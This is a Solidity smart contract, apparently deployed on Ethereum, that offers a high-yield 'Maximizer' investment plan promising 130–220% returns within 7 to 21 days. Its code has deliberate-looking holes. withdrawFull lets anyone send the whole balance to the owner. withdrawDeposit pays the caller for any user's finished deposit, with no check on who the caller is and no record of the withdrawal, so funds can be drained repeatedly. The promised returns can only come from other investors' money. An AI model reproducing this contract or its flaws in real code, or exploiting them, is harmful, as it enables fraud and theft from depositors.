/**
 *Submitted for verification at Etherscan.io on 2021-07-08
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract Maximizer {
    using SafeMath for uint256;
    
    address payable public owner;
    
	uint256 constant public PROJECT_FEE = 10;
	uint256 constant public PERCENTS_DIVIDER = 100;
	uint256 constant public TIME_STEP = 1 days;
	
	uint256 constant public INVEST_MIN_AMOUNT = 0.01 ether;
	uint256 constant public INVEST_MAX_AMOUNT = 5 ether;
    
    struct Plan {
        uint256 time;
        uint256 percent;
    }
    
    struct Deposit {
        uint8 plan;
		uint256 percent;
		uint256 amount;
		uint256 profit;
		uint256 start;
		uint256 finish;
	}
	
	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		uint256 bonus;
		uint256 totalBonus;
	}

    mapping (address => User) internal users;
    
    Plan[] internal plans;
    
    event FeePayed(address indexed user, uint256 totalAmount);
    
   	constructor() {
   	    owner = payable(msg.sender);
   	    
   	    plans.push(Plan(7, 130));
   	    plans.push(Plan(14, 180));
   	    plans.push(Plan(21, 220));
	}
	
	function invest(uint8 plan) public payable {
	    require(msg.value >= INVEST_MIN_AMOUNT);
		require(msg.value <= INVEST_MAX_AMOUNT);
		
	    uint256 fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
		owner.transfer(fee);
		emit FeePayed(msg.sender, fee);
		
		User storage user = users[msg.sender];

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
		}

		(uint256 percent, uint256 profit, uint256 finish) = getResult(plan, msg.value);
		user.deposits.push(Deposit(plan, percent, msg.value, profit, block.timestamp, finish));
	}
	
	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
		time = plans[plan].time;
		percent = plans[plan].percent;
	}
	
	function getResult(uint8 plan, uint256 deposit) public view returns (uint256 percent, uint256 profit, uint256 finish) {
		percent = plans[plan].percent;
		profit = deposit.mul(percent).div(PERCENTS_DIVIDER);
		finish = block.timestamp.add(plans[plan].time.mul(TIME_STEP));
	}
	
	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}
	
	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish) {
	    User storage user = users[userAddress];

		plan = user.deposits[index].plan;
		percent = user.deposits[index].percent;
		amount = user.deposits[index].amount;
		profit = user.deposits[index].profit;
		start = user.deposits[index].start;
		finish = user.deposits[index].finish;
	}
	
	function withdrawDeposit(address userAddress, uint256 index) public {
	    User storage user = users[userAddress];
	    
	    require(user.deposits[index].finish < block.timestamp, "Deposit not finished");

	    payable(msg.sender).transfer(user.deposits[index].profit);
	}
	
	function withdrawFull() public {
	    owner.transfer(address(this).balance);
	}
	
   
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}